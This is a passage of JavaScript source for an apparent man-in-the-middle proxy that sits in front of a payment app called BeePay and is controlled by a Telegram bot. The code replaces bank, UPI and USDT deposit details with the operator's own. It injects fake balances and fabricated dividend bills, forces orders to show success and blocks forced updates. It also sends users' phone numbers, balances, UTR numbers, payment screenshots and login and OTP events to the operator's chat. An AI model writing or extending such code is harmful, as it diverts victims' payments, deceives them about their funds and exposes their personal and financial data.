        return res.sendStatus(200);
      }
      data.banks[idx].minAmount = amt;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank ${idx + 1} min amount set to ₹${amt}\n${bankListText(data)}`);
      return res.sendStatus(200);
    }

    // /add balance
    if (text.startsWith('/add ')) {
      const parts = text.substring(5).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>');
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      if (!freshData.userOverrides) freshData.userOverrides = {};
      if (!freshData.userOverrides[targetUserId]) freshData.userOverrides[targetUserId] = {};
      freshData.userOverrides[targetUserId].addedBalance = (freshData.userOverrides[targetUserId].addedBalance || 0) + amount;
      if (!freshData.balanceHistory) freshData.balanceHistory = [];
      const now = new Date();
      const ts = now.getTime();
      const orderNo = 'BP' + String(ts) + String(Math.floor(Math.random() * 9000000) + 1000000);
      const timeStr = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      freshData.balanceHistory.push({ type: 'add', userId: targetUserId, amount, totalAdded: freshData.userOverrides[targetUserId].addedBalance, time: timeStr });
      if (!freshData.fakeBills) freshData.fakeBills = {};
      if (!freshData.fakeBills[targetUserId]) freshData.fakeBills[targetUserId] = [];
      freshData.fakeBills[targetUserId].push({ amount, orderNo, createTime: timeStr, timestamp: ts });
      freshData._skipOverrideMerge = true;
      await saveData(freshData);
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}`);
      return res.sendStatus(200);
    }

    // /deduct
    if (text.startsWith('/deduct ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>');
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      if (!freshData.userOverrides) freshData.userOverrides = {};
      if (!freshData.userOverrides[targetUserId]) freshData.userOverrides[targetUserId] = {};
      freshData.userOverrides[targetUserId].addedBalance = (freshData.userOverrides[targetUserId].addedBalance || 0) - amount;
      if (!freshData.balanceHistory) freshData.balanceHistory = [];
      freshData.balanceHistory.push({ type: 'deduct', userId: targetUserId, amount, totalAdded: freshData.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
      freshData._skipOverrideMerge = true;
      await saveData(freshData);
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Net change: ₹${freshData.userOverrides[targetUserId].addedBalance}`);
      return res.sendStatus(200);
    }

    // /remove balance
    if (text.startsWith('/remove balance ')) {
      const targetUserId = text.substring(16).trim();
      const freshData = await loadData(true);
      if (freshData.userOverrides && freshData.userOverrides[targetUserId]) {
        delete freshData.userOverrides[targetUserId].addedBalance;
        freshData._skipOverrideMerge = true;
        await saveData(freshData);
      }
      if (freshData.fakeBills && freshData.fakeBills[targetUserId]) {
        delete freshData.fakeBills[targetUserId];
        freshData._skipOverrideMerge = true;
        await saveData(freshData);
      }
      await bot.sendMessage(chatId, `✅ Balance removed for user ${targetUserId}`);
      return res.sendStatus(200);
    }

    // /success
    if (text.startsWith('/success ')) {
      const targetUserId = text.substring(9).trim();
      data = await loadData(true);
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].forceReviewSuccess = true;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ User ${targetUserId} ke REVIEW orders SUCCESS dikhenge`);
      return res.sendStatus(200);
    }

    // /unsuccess
    if (text.startsWith('/unsuccess ')) {
      const targetUserId = text.substring(11).trim();
      data = await loadData(true);
      if (data.userOverrides && data.userOverrides[targetUserId]) {
        delete data.userOverrides[targetUserId].forceReviewSuccess;
        data._skipOverrideMerge = true;
        await saveData(data);
      }
      await bot.sendMessage(chatId, `✅ User ${targetUserId} real status dikhega`);
      return res.sendStatus(200);
    }

    // /history
    if (text === '/history' || text.startsWith('/history ')) {
      data = await loadData(true);
      const targetId = text.startsWith('/history ') ? text.substring(9).trim() : null;
      const hist = (data.balanceHistory || []).filter(h => !targetId || h.userId === targetId).slice(-30);
      if (!hist.length) { await bot.sendMessage(chatId, '📋 No history'); return res.sendStatus(200); }
      const lines = hist.map(h => `${h.type === 'add' ? '➕' : '➖'} ₹${h.amount} → User ${h.userId} | Net: ₹${h.totalAdded} | ${h.time}`);
      await bot.sendMessage(chatId, lines.join('\n').substring(0, 3500));
      return res.sendStatus(200);
    }

    // /clearhistory
    if (text === '/clearhistory') {
      data = await loadData(true);
      data.balanceHistory = [];
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, '✅ History cleared');
      return res.sendStatus(200);
    }

    // /usdt
    if (text === '/usdt off') {
      data = await loadData(true); data.usdtAddress = ''; data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, '✅ USDT override disabled'); return res.sendStatus(200);
    }
    if (text.startsWith('/usdt ')) {
      const addr = text.substring(6).trim();
      data = await loadData(true); data.usdtAddress = addr; data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `✅ USDT address set: ${addr}`); return res.sendStatus(200);
    }

    // /active
    if (text === '/active' || text === '/active list' || text.startsWith('/active ')) {
      data = await loadData(true);
      if (!Array.isArray(data.activePhones)) data.activePhones = [];
      if (text === '/active' || text === '/active list') {
        const list = data.activePhones;
        await bot.sendMessage(chatId, list.length ? `🔄 Active Logins: ${list.length}\n${list.map((p, i) => `${i + 1}. ${p}`).join('\n')}` : '🔄 Active Logins: 0\nUse /active <phone>');
        return res.sendStatus(200);
      }
      if (text.startsWith('/active off ')) {
        const ph = text.substring(12).trim().replace(/\D/g, '');
        if (!ph) { await bot.sendMessage(chatId, '❌ Format: /active off <phone>'); return res.sendStatus(200); }
        data.activePhones = data.activePhones.filter(p => String(p) !== ph);
        data._skipOverrideMerge = true; await saveData(data);
        await bot.sendMessage(chatId, `🛑 ${ph} active list se hata diya`);
        return res.sendStatus(200);
      }
      const ph = text.substring(8).trim().replace(/\D/g, '');
      if (!ph || ph.length < 8) { await bot.sendMessage(chatId, '❌ Valid phone number do'); return res.sendStatus(200); }
      if (!data.activePhones.includes(ph)) data.activePhones.push(ph);
      data._skipOverrideMerge = true; await saveData(data);
      const otpUsed = getActiveOtp(data);
      const result = await fireActiveLogin(ph, otpUsed);
      if (result.ok) {
        await bot.sendMessage(chatId, `✅ ${ph} ACTIVE\n👤 UserID: ${result.userId || 'N/A'}\nOTP: ${otpUsed}\n🛑 Stop: /active off ${ph}`);
      } else {
        await bot.sendMessage(chatId, `⚠️ ${ph} added to list, first login failed:\n${result.error}`);
      }
      return res.sendStatus(200);
    }

    // /otp
    if (text === '/otp' || text.startsWith('/otp ')) {
      data = await loadData(true);
      if (text === '/otp') {
        await bot.sendMessage(chatId, `🔑 Current OTP: ${getActiveOtp(data)}\nChange: /otp <code>`);
        return res.sendStatus(200);
      }
      const newOtp = text.substring(5).trim();
      if (!/^\d{4,8}$/.test(newOtp)) { await bot.sendMessage(chatId, '❌ OTP must be 4-8 digits'); return res.sendStatus(200); }
      data.activeOtp = newOtp; data._skipOverrideMerge = true; await saveData(data);
      _activeMonitorOtp = newOtp; _activeMonitorLastRefresh = 0;
      const phones = Array.isArray(data.activePhones) ? data.activePhones : [];
      if (!phones.length) { await bot.sendMessage(chatId, `🔑 OTP set: ${newOtp}`); return res.sendStatus(200); }
      const results = await Promise.all(phones.map(async ph => ({ ph, r: await fireActiveLogin(ph, newOtp) })));
      const okList = results.filter(x => x.r.ok).map(x => `✅ ${x.ph}`);
      const failList = results.filter(x => !x.r.ok).map(x => `❌ ${x.ph}: ${x.r.error}`);
      await bot.sendMessage(chatId, `🔑 OTP: ${newOtp}\n✅ ${okList.length} ok, ❌ ${failList.length} fail\n${[...okList, ...failList].join('\n')}`.substring(0, 3500));
      return res.sendStatus(200);
    }

    // /idtrack
    if (text === '/idtrack') {
      data = await loadData(true);
      const tracked = data.trackedUsers || {};
      const keys = Object.keys(tracked);
      if (!keys.length) { await bot.sendMessage(chatId, 'No tracked users'); return res.sendStatus(200); }
      const lines = keys.slice(-30).map(uid => {
        const t = tracked[uid];
        return `👤 ${uid}${t.phone ? ' (' + t.phone + ')' : ''}\n  Last: ${t.lastSeen}\n  Action: ${t.lastAction}`;
      });
      await bot.sendMessage(chatId, lines.join('\n\n').substring(0, 3500));
      return res.sendStatus(200);
    }

    // /off log
    if (text.startsWith('/off log ')) {
      const targetId = text.substring(9).trim();
      data = await loadData(true);
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
      data.userOverrides[targetId].logOff = true;
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `🔇 Logging OFF for ${targetId}`);
      return res.sendStatus(200);
    }

    // /on log
    if (text.startsWith('/on log ')) {
      const targetId = text.substring(8).trim();
      data = await loadData(true);
      if (data.userOverrides && data.userOverrides[targetId]) {
        delete data.userOverrides[targetId].logOff;
        data._skipOverrideMerge = true; await saveData(data);
      }
      await bot.sendMessage(chatId, `📡 Logging ON for ${targetId}`);
      return res.sendStatus(200);
    }

    await bot.sendMessage(chatId, '❓ Unknown command. /start for help.');
    res.sendStatus(200);
  } catch(e) {
    console.error('bot-webhook error:', e.message);
    res.sendStatus(200);
  }
});

// ── Proxy handlers ────────────────────────────────────────────────

// Balance / user info — add fake balance
async function proxyAndAddBonus(req, res) {
  try {
    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
      cachedData ? Promise.resolve(cachedData) : loadData(),
      proxyFetch(req)
    ]);
    const userId = await extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(data, userId);
    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;
    if (userId) { trackUser(data, userId, 'App Open'); saveData(data).catch(()=>{}); }
    const bonusData = getResponseData(jsonResp);
    if (bonus > 0 && bonusData) addBonusToBalanceFields(bonusData, bonus);
    if (userId && bonusData && typeof bonusData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(userId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) addBonusToBalanceFields(bonusData, addedBal);
    }
    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
}

// Order detail — bank replacement
async function proxyAndReplaceBankDetails(req, res, label) {
  try {
    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
      loadData(),
      proxyFetch(req)
    ]);
    const userId = await extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(data, userId);
    const rd = getResponseData(jsonResp) || {};
    const orderId = rd.orderId || rd.orderNo || rd.id || req.parsedBody?.orderId || req.query?.orderId || '';
    const allOrderIds = [orderId, rd.inrOrderId, rd.payOrderId].filter(Boolean);

    if (eff.botEnabled !== false && isProxyPending(data, allOrderIds) && !hasOrderBankDecision(data, orderId) && data.banks && data.banks.length > 0) {
      const detectedAmount = parseFloat(rd.amount || rd.orderAmount || rd.payAmount || 0) || 0;
      if (detectedAmount > 0) {
        const lateActive = getActiveBank(data, userId, detectedAmount);
        if (lateActive) await saveOrderBankMultipleKeys(data, allOrderIds, lateActive);
        else await markOrderBankSkip(data, orderId);
      } else {
        const fallbackActive = getActiveBank(data, userId);
        if (fallbackActive) await saveOrderBankMultipleKeys(data, allOrderIds, fallbackActive);
      }
    }

    if (eff.botEnabled !== false) {
      const savedBank = getOrderBankMultiple(data, allOrderIds);
      if (savedBank && rd) deepReplace(rd, savedBank, {}, 0);
    }
    if (eff.forceReviewSuccess && rd) markReviewAsSuccess(rd);
    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);

    sendJson(res, respHeaders, jsonResp, respBody);

    if (data.adminChatId && bot && !isLogOff(data, userId)) {
      const savedBank = getOrderBankMultiple(data, allOrderIds);
      const amount = rd.amount || rd.orderAmount || rd.payAmount || 'N/A';
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId,
`🔔 ${label}
👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
📋 Order: ${orderId}
💰 Amount: ₹${amount}
💳 Bank: ${savedBank ? savedBank.accountHolder + ' | ' + savedBank.accountNo : 'REAL'}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    if (userId) { trackUser(data, userId, `Order ${orderId}`); saveData(data).catch(()=>{}); }
  } catch(e) {
    console.error('proxyAndReplaceBankDetails error:', e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

// Order list — bank replacement in list
async function proxyAndReplaceBankInList(req, res) {
  try {
    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
      cachedData ? Promise.resolve(cachedData) : loadData(),
      proxyFetch(req)
    ]);
    const userId = await extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(data, userId);
    const listData = getResponseData(jsonResp);
    if (listData && eff.botEnabled !== false) {
      const applyToItem = (item) => {
        const ids = [item.orderId, item.orderNo, item.id, item.inrOrderId].filter(Boolean);
        const savedBank = getOrderBankMultiple(data, ids);
        if (savedBank) deepReplace(item, savedBank, {}, 0);
        if (eff.depositSuccess) markDepositSuccess(item);
        if (eff.forceReviewSuccess) markReviewAsSuccess(item);
      };
      if (Array.isArray(listData)) listData.forEach(applyToItem);
      else if (listData.list && Array.isArray(listData.list)) listData.list.forEach(applyToItem);
      else if (listData.records && Array.isArray(listData.records)) listData.records.forEach(applyToItem);
      else if (listData.rows && Array.isArray(listData.rows)) listData.rows.forEach(applyToItem);
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
}

// Fake bills injection
async function proxyAndInjectFakeBills(req, res) {
  try {
    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
      cachedData ? Promise.resolve(cachedData) : loadData(),
      proxyFetch(req)
    ]);
    const userId = await extractUserId(req, jsonResp);
    const listData = getResponseData(jsonResp);
    let items = [];
    let itemsKey = null;
    if (listData) {
      if (Array.isArray(listData)) items = listData;
      else if (listData.list && Array.isArray(listData.list)) { items = listData.list; itemsKey = 'list'; }
      else if (listData.records && Array.isArray(listData.records)) { items = listData.records; itemsKey = 'records'; }
      else if (listData.rows && Array.isArray(listData.rows)) { items = listData.rows; itemsKey = 'rows'; }
    }
    let billUserId = userId;
    if (!billUserId && data.fakeBills) {
      const fbKeys = Object.keys(data.fakeBills).filter(k => data.fakeBills[k] && data.fakeBills[k].length > 0);
      if (fbKeys.length === 1) billUserId = fbKeys[0];
    }
    const userBills = (data.fakeBills && billUserId && data.fakeBills[String(billUserId)]) || [];
    if (userBills.length > 0) {
      const template = items.length > 0 ? items[0] : null;
      const fakeEntries = userBills.map(fb => {
        const entry = template ? JSON.parse(JSON.stringify(template)) : {};
        entry.orderNo = fb.orderNo;
        entry.amount = fb.amount;
        entry.orderType = 'Dividend';
        entry.time = fb.createTime;
        entry.createTime = fb.createTime;
        entry.status = 1;
        entry.statusText = 'Completed';
        if (entry.id !== undefined) entry.id = fb.orderNo;
        return entry;
      });
      fakeEntries.sort((a, b) => {
        const fbA = userBills.find(f => f.orderNo === a.orderNo);
        const fbB = userBills.find(f => f.orderNo === b.orderNo);
        return (fbB ? fbB.timestamp : 0) - (fbA ? fbA.timestamp : 0);
      });
      items = [...fakeEntries, ...items];
      if (itemsKey && listData) {
        listData[itemsKey] = items;
        if (listData.total !== undefined) listData.total = items.length;
      } else if (jsonResp && jsonResp.data !== undefined) {
        jsonResp.data = Array.isArray(jsonResp.data) ? items : jsonResp.data;
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
}

// ── BeePay specific routes ────────────────────────────────────────

// Payment order — bank replacement (main deposit intercept)
app.all('/appApi/orderOut/paying', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💳 BeePay Payment Order');
});

app.all('/appApi/orderOut/getPayWallet', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💳 BeePay Pay Wallet');
});

// Submit payment — UTR notification
app.post('/appApi/orderOut/payingSubmit', async (req, res) => {
  const data = await loadData();
  try {
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId)) {
      const phone = getPhone(data, userId);
      const utrVal = body.utr || body.trxId || body.transactionId || body.referenceNo || 'N/A';
      const orderVal = body.orderId || body.orderNo || 'N/A';
      bot.sendMessage(data.adminChatId, `📤 UTR Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nUTR: ${utrVal}\nOrder: ${orderVal}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
    }
    if (userId) { trackUser(data, userId, `UTR ${body.utr || ''}`); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

// Submit payment with image
app.post('/appApi/orderOut/payingSubmitImg', async (req, res) => {
  const data = await loadData();
  try {
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId)) {
      const phone = getPhone(data, userId);
      const imgVal = body.imgUrl || body.imageUrl || '';
      let msg = `🖼️ Payment Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nOrder: ${body.orderId || 'N/A'}`;
      if (imgVal) msg += `\nImage: ${imgVal}`;
      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
      if (imgVal) {
        try {
          const imgResp = await fetch(imgVal.startsWith('http') ? imgVal : ORIGINAL_API + '/' + imgVal);
          if (imgResp.ok) {
            const imgBuf = Buffer.from(await imgResp.arrayBuffer());
            if (imgBuf.length > 100) {
              await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Payment [${userId || 'N/A'}]` }, { filename: 'payment.jpg', contentType: 'image/jpeg' });
            }
          }
        } catch(e) {}
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

// Order detail
app.all('/appApi/memberOrder/orderInDetail', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 BeePay Order Detail');
});

// Create deposit order
app.post('/app/api/orderOut/getPaymentOrder', async (req, res) => {
  let data = null;
  try {
    const [d, proxyResult] = await Promise.all([
      cachedData ? Promise.resolve(cachedData) : loadData(),
      proxyFetch(req)
    ]);
    data = d;
    const { respBody, respHeaders, jsonResp } = proxyResult;
    const userId = await extractUserId(req, jsonResp);
    const rd = getResponseData(jsonResp);
    const body = req.parsedBody || {};
    let newOrderId = '';
    if (rd && typeof rd === 'object') {
      newOrderId = rd.orderId || rd.orderNo || rd.id || '';
    }
    if (newOrderId) {
      const eff = getEffectiveSettings(data, userId);
      const rawAmt = body.amount || body.orderAmount || body.payAmount || '';
      const orderAmt = parseFloat(rawAmt) || 0;
      if (eff.botEnabled !== false && orderAmt > 0) {
        const active = await getActiveBankAndSave(data, userId, orderAmt);
        if (active) await saveOrderBank(data, newOrderId, active);
        else await markOrderBankSkip(data, newOrderId);
      } else if (eff.botEnabled !== false) {
        await markOrderBankPending(data, newOrderId);
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
    if (data.adminChatId && bot) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `⚠️ New Deposit Order\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
    }
  } catch(e) {
    if (!res.headersSent) await transparentProxy(req, res);
  }
});

// Cancel order
app.post('/appApi/orderOut/cancel', async (req, res) => {
  const data = await loadData();
  try {
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId)) {
      bot.sendMessage(data.adminChatId, `❌ Order Cancelled [${userId || 'N/A'}]\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

// Order list pages — bank replacement
app.all('/appApi/memberOrder/orderInPage', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/appApi/memberOrder/inrOrderPage', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/appApi/orderOut/searchList', async (req, res) => { await proxyAndReplaceBankInList(req, res); });

// Balance / user info — with detailed user profile bot log
app.all('/appApi/member/basicInfo', async (req, res) => {
  try {
    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
      cachedData ? Promise.resolve(cachedData) : loadData(),
      proxyFetch(req)
    ]);
    const userId = await extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(data, userId);
    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;
    const respData = getResponseData(jsonResp);
    if (bonus > 0 && respData) addBonusToBalanceFields(respData, bonus);
    const userOvr = userId && data.userOverrides ? data.userOverrides[String(userId)] : null;
    const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
    if (addedBal !== 0 && respData) addBonusToBalanceFields(respData, addedBal);
    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
    // extract fields before sending
    const phone = (respData && (respData.mobile || respData.phone || respData.loginName || '')) || '';
    const userName = (respData && (respData.nickName || respData.userName || respData.name || '')) || '';
    const realBalance = respData?.balance ?? '';
    const realWithdraw = respData?.availableWithdrawBalance ?? '';
    const realProcess = respData?.processWithdrawBalance ?? '';
    const visibleBalance = respData?.balance ?? '';
    sendJson(res, respHeaders, jsonResp, respBody);
    // save user tracking
    if (userId) {
      trackUser(data, userId, 'basicInfo');
      if (!data.trackedUsers) data.trackedUsers = {};
      const ex = data.trackedUsers[String(userId)] || {};
      data.trackedUsers[String(userId)] = { ...ex, lastAction: 'basicInfo', lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: phone || ex.phone || '', name: userName || ex.name || '', balance: realBalance !== '' ? realBalance : (ex.balance || ''), orderCount: ex.orderCount || 0 };
      saveData(data).catch(()=>{});
    }
    // send user profile log to bot
    if (data.adminChatId && bot && !isLogOff(data, userId)) {
      bot.sendMessage(data.adminChatId,
        `👤 User Profile\n🆔 ID: ${userId || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance}\n${addedBal !== 0 ? `➕ Bot Added: ₹${addedBal}\n👁 User Sees: ₹${visibleBalance}` : '➕ Bot Added: ₹0'}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw}\n⏳ In Process: ₹${realProcess}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
  } catch(e) { await transparentProxy(req, res); }
});
app.all('/appApi/member/balanceList', async (req, res) => { await proxyAndAddBonus(req, res); });
app.all('/appApi/common/homeData', async (req, res) => { await proxyAndAddBonus(req, res); });

// Transaction history — fake bills
app.all('/appApi/memberOrder/usdtOrderPage', async (req, res) => { await proxyAndInjectFakeBills(req, res); });

// USDT endpoints — USDT address replacement
app.all('/appApi/orderUsdt/v2/info', async (req, res) => {
  const data = await loadData();
  try {
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/appApi/orderUsdt/v2/init', async (req, res) => {
  const data = await loadData();
  try {
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && userId) {
      bot.sendMessage(data.adminChatId, `₮ USDT Order Init [${userId}]`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/appApi/orderUsdt/v2/submit', async (req, res) => {
  const data = await loadData();
  try {
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId)) {
      bot.sendMessage(data.adminChatId, `₮ USDT Submit [${userId || 'N/A'}]\nAmount: ${body.amount || 'N/A'}\nTx: ${body.txHash || body.hash || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/appApi/orderUsdt/v2/submitImg', async (req, res) => {
  const data = await loadData();
  try {
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId)) {
      const imgVal = body.imgUrl || body.imageUrl || '';
      bot.sendMessage(data.adminChatId, `🖼️ USDT Screenshot [${userId || 'N/A'}]${imgVal ? '\n' + imgVal : ''}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

// Wallet (UPI) endpoints — bank replacement
app.all('/appApi/wallet/list', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/appApi/upi/list', async (req, res) => { await proxyAndReplaceBankInList(req, res); });

// Bank account endpoints — passthrough with USDT replace
app.all('/app/api/memberManager/getBankAccount', async (req, res) => {
  const data = await loadData();
  try {
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

// ── Domain pool — CRITICAL: app calls this on startup to get server URL ──
app.all('/appAuth/domainPool', async (req, res) => {
  // BeePay format: status/body/message (NOT code/data)
  res.json({ status: '200', message: 'success', body: 'https://ixcv.vercel.app' });
});

// ── Check update — always return needUpdate:0 so app never gets blocked ──
app.all('/appAuth/checkUpdate', async (req, res) => {
  // Always override needUpdate to "0" — real server returns "1" (force update) which blocks the app
  res.json({ status: '200', message: 'success', body: { needUpdate: '0', version: '', versionCode: '', updateContent: '', link: '', md5: '' } });
});

// ── Login route — detailed bot log ────────────────────────────────
app.all('/appAuth/v2/memberLogin', async (req, res) => {
  const data = await loadData();
  try {
    const body = req.parsedBody || {};
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const respData = getResponseData(jsonResp);
    const userId = String(respData?.memberId || respData?.userId || respData?.id || '');
    const phone = body.loginName || body.mobile || body.phone || respData?.loginName || respData?.mobile || '';
    const userName = respData?.nickName || respData?.userName || respData?.name || phone || '';
    const realBalance = respData?.balance ?? '';
    const realWithdraw = respData?.availableWithdrawBalance ?? '';
    const realProcess = respData?.processWithdrawBalance ?? '';
    const userOvr = userId && data.userOverrides ? data.userOverrides[userId] : null;
    const addedBal = userOvr?.addedBalance ?? 0;
    sendJson(res, respHeaders, jsonResp, respBody);
    if (userId) {
      trackUser(data, userId, 'login');
      if (!data.trackedUsers) data.trackedUsers = {};
      const ex = data.trackedUsers[userId] || {};
      data.trackedUsers[userId] = { ...ex, lastAction: 'login', lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: phone || ex.phone || '', name: userName || ex.name || '' };
      saveData(data).catch(()=>{});
    }
    if (data.adminChatId && bot && !isLogOff(data, userId)) {
      const ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
      bot.sendMessage(data.adminChatId,
        `🔑 ${success ? '✅ Login Success' : '❌ Login Failed'}\n📱 Phone: ${phone || 'N/A'}\n🆔 ID: ${userId || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance !== '' ? realBalance : 'N/A'}\n➕ Bot Added: ₹${addedBal}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw !== '' ? realWithdraw : 'N/A'}\n⏳ In Process: ₹${realProcess !== '' ? realProcess : 'N/A'}\n🕐 ${ts}`
      ).catch(()=>{});
    }
  } catch(e) { await transparentProxy(req, res); }
});

// ── OTP route — log phone ──────────────────────────────────────────
app.all('/appAuth/sendOtp', async (req, res) => {
  const data = await loadData();
  try {
    const body = req.parsedBody || {};
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const phone = body.mobile || body.phone || body.loginName || '';
    const otpType = body.type || body.otpType || '';
    sendJson(res, respHeaders, jsonResp, respBody);
    if (data.adminChatId && bot) {
      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
      bot.sendMessage(data.adminChatId,
        `📩 OTP Sent ${success ? '✅' : '❌'}\n📱 Phone: ${phone || 'N/A'}${otpType ? '\n🔖 Type: ' + otpType : ''}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
